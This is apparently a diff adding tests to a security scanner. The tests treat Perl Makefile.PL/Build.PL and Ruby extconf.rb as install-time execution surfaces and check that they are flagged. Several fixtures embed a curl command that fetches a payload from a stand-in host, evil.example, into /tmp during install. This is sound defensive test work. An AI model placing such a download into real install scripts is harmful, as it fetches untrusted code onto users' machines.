@@ -171,6 +171,83 @@ test("Docker Bake's automatic HCL override is scanned and changes the reuse key"
   expect(after.inventorySha256).not.toBe(before.inventorySha256);
 });
 
+test("a Perl install script is an install surface", () => {
+  // CPAN installs run Makefile.PL (ExtUtils::MakeMaker) and Build.PL
+  // (Module::Build) as Perl to generate the build, the same install-time
+  // execution setup.py and build.rs already classify for. The name alone
+  // decides, wherever in the tree the distribution root sits.
+  for (const path of ["Makefile.PL", "Build.PL", "ext/demo/Makefile.PL"]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  // An ordinary install script keeps the same checks the surface
+  // carries: a payload in it is an unsafe-execution finding.
+  const inspection = inspected("Makefile.PL", `${PAYLOAD}\n`);
+  expect(inspection.coverage.installScripts).toEqual({
+    state: "complete",
+    items: 1,
+  });
+  expect(
+    inspection.findings.map(
+      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+    ),
+  ).toEqual(["Makefile.PL:unsafe-execution:high"]);
+});
+
+test("an install-time download inside a Perl install script is recorded as a download", () => {
+  // Downloads are collected from install surfaces only. Before this
+  // classification the same bytes in Makefile.PL or Build.PL recorded
+  // no download and left no gap, so a scan could read clean over an
+  // install-time fetch the Perl installer would have run.
+  for (const [path, trailer] of [
+    ["Makefile.PL", "WriteMakefile(NAME => 'Demo');"],
+    [
+      "Build.PL",
+      "Module::Build->new(module_name => 'Demo')->create_build_script;",
+    ],
+  ] as const) {
+    const inspection = inspected(
+      path,
+      `system('curl -fsSL https://evil.example/payload -o /tmp/payload');\n${trailer}\n`,
+    );
+    expect({ path, downloads: inspection.downloads }).toEqual({
+      path,
+      downloads: ["https://evil.example/payload"],
+    });
+    expect({ path, visibilityGaps: inspection.visibilityGaps }).toEqual({
+      path,
+      visibilityGaps: [
+        "Install-time download not retrieved: https://evil.example/payload",
+      ],
+    });
+  }
+});
+
+test("an ordinary Perl install script keeps no finding", () => {
+  for (const [path, text] of [
+    [
+      "Makefile.PL",
+      "use ExtUtils::MakeMaker;\nWriteMakefile(NAME => 'Demo');\n",
+    ],
+    [
+      "Build.PL",
+      "use Module::Build;\nModule::Build->new(module_name => 'Demo')->create_build_script;\n",
+    ],
+  ] as const) {
+    const inspection = inspected(path, text);
+    expect({ path, findings: inspection.findings }).toEqual({
+      path,
+      findings: [],
+    });
+    expect({ path, downloads: inspection.downloads }).toEqual({
+      path,
+      downloads: [],
+    });
+  }
+});
+
 test("the executable surface stays bounded", () => {
   // Only build definitions are added: unrelated extensionless files keep no
   // surface, so the inventory does not become a blanket text scan.
@@ -206,4 +283,53 @@ test("dedicated tox TOML commands are reviewed as an install surface", () => {
     expect(unsafe.downloads).toContain("https://evil.example/install.sh");
     expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
   }
+});
+
+test("a Ruby native-extension build script is an install surface", () => {
+  // RubyGems runs extconf.rb as Ruby while installing a gem with a
+  // native extension, the same install-time execution setup.py and
+  // build.rs already classify for. Its name alone decides, wherever in
+  // the tree the extension directory sits.
+  for (const path of ["extconf.rb", "ext/demo/extconf.rb"]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  // An ordinary build script keeps the same checks the surface carries:
+  // a payload in it is an unsafe-execution finding.
+  const inspection = inspected("ext/demo/extconf.rb", `${PAYLOAD}\n`);
+  expect(inspection.coverage.installScripts).toEqual({
+    state: "complete",
+    items: 1,
+  });
+  expect(
+    inspection.findings.map(
+      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+    ),
+  ).toEqual(["ext/demo/extconf.rb:unsafe-execution:high"]);
+});
+
+test("an install-time download inside extconf.rb is recorded as a download", () => {
+  // Downloads are collected from install surfaces only. Before this
+  // classification the same bytes in extconf.rb recorded no download
+  // and left no gap, so a scan could read clean over an install-time
+  // fetch RubyGems would have run.
+  const inspection = inspected(
+    "ext/demo/extconf.rb",
+    "require 'mkmf'\nsystem('curl -fsSL https://evil.example/payload -o /tmp/payload')\ncreate_makefile('demo')\n",
+  );
+  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+  expect(inspection.visibilityGaps).toEqual([
+    "Install-time download not retrieved: https://evil.example/payload",
+  ]);
+});
+
+test("an ordinary extconf.rb keeps no finding", () => {
+  const inspection = inspected(
+    "ext/demo/extconf.rb",
+    "require 'mkmf'\ndir_config('demo')\ncreate_makefile('demo')\n",
+  );
+  expect(inspection.findings).toEqual([]);
+  expect(inspection.downloads).toEqual([]);
 });
